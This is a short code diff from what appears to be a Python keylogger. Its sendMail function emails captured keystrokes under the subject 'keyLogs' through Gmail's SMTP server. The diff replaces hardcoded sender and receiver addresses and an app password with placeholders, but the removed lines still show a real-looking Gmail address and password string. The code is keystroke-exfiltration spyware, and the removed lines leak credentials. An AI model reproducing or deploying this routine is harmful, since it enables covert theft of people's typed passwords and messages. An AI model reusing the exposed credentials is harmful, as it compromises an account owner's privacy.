@@ -22,8 +22,8 @@ seconds = 60
 
 # Function to send an email with the provided key data
 def sendMail(key):
-    senderEmail = "dhananjayc0907@gmail.com"  # Sender's email address
-    receiver_email = "dhananjaychavan0907@gmail.com"  # Receiver's email address
+    senderEmail = "senderemail@gmail.com"  # Sender's email address
+    receiver_email = "recieveremail@gmail.com"  # Receiver's email address
     subject = "keyLogs"  # Email subject
     message = key  # The content of the email, which is the key(s) pressed
     text = f"Subject: {subject} \n\n{message}"  # Combining subject and message
@@ -32,7 +32,7 @@ def sendMail(key):
         # Setting up the email server and login
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
-        server.login(senderEmail, "jfraqwamhfdddnle")  # Note: You should never hardcode passwords in real applications
+        server.login(senderEmail, "##############")  # Note: You should never hardcode passwords in real applications
         # Sending the email
         server.sendmail(senderEmail, receiver_email, text)
         print("Mail sent successfully !")
